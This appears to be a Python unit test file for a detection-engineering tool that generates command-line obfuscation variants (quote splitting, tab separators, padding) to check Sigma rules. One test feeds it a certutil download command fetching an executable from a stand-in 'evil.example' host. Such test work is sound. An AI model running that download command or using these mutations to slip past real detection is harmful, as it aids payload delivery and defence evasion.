import unittest

from sigma_mutate.mutators import generate

BS = chr(92)


class MutatorTests(unittest.TestCase):
    def kinds(self, cmd):
        return {m.mutator for m in generate(cmd)}

    def test_quote_wrap_and_tab(self):
        values = {m.mutator: m.value for m in generate("app.exe /c whoami")}
        self.assertIn('"whoami"', values["quote_wrap"])
        self.assertEqual(values["tab_separator"], "app.exe\t/c\twhoami")

    def test_single_character_tokens_get_no_quote_split(self):
        names = [m.label for m in generate("app.exe x -") if m.mutator == "quote_split"]
        self.assertFalse(any(("(x)" in n or "(-)" in n) for n in names))

    def test_punctuation_boundaries_are_used(self):
        values = [m.value for m in generate("app.exe -i #+") if m.mutator == "quote_split"]
        self.assertIn('app.exe -""i #+', values)
        self.assertIn('app.exe -i #""+', values)

    def test_all_arguments_variant(self):
        values = [m.value for m in generate("app.exe -ab -cd") if m.label.startswith("all arguments")]
        self.assertTrue(values)
        self.assertTrue(all(v.count('""') == 2 for v in values))

    def test_never_inserts_next_to_a_backslash(self):
        cmd = "C:" + BS + "dir" + BS + "file.exe"
        for m in generate(cmd):
            if m.mutator == "quote_split":
                self.assertNotIn(BS + '""', m.value)
                self.assertNotIn('""' + BS, m.value)

    def test_every_mutation_differs_from_the_original(self):
        cmd = "certutil.exe -urlcache -f http://evil.example/a.exe a.exe"
        self.assertTrue(all(m.value != cmd for m in generate(cmd, ("argv", "cmd.exe", "program"))))

    def test_program_name_split_is_cmd_only(self):
        default = [m for m in generate("a.exe -bcd") if m.mutator == "quote_split"]
        self.assertTrue(default and all(not m.label.startswith("token 0") for m in default))
        full = [m for m in generate("a.exe -bcd", ("cmd.exe",)) if m.mutator == "quote_split"]
        self.assertTrue(any(m.label.startswith("token 0") for m in full))

    def test_cmd_payload_quotes_are_not_argv_equivalent(self):
        default = generate("cmd.exe /c type C:" + BS + "x" + BS + "file.txt")
        self.assertFalse([m for m in default if m.mutator in ("quote_split", "quote_wrap")
                          and not m.label.startswith("token 0")])
        self.assertTrue([m for m in default if m.mutator in ("space_padding", "tab_separator")])
        full = generate("cmd.exe /c type file.txt", ("argv", "cmd.exe", "program"))
        self.assertTrue([m for m in full if m.mutator == "quote_split" and m.assumption == "program"])

    def test_program_status(self):
        from sigma_mutate.mutators import program_status
        self.assertEqual(program_status("certutil.exe -urlcache x"), "validated")
        self.assertEqual(program_status("C:" + BS + "Windows" + BS + "System32" + BS + "CMD.EXE /c x"), "self-parsing")
        self.assertEqual(program_status("mshta.exe x"), "unvalidated")
        self.assertEqual(program_status("app.exe x"), "unspecified")

    def test_default_is_argv_only(self):
        self.assertEqual({m.assumption for m in generate("a.exe -b http://x")}, {"argv"})


if __name__ == "__main__":
    unittest.main()
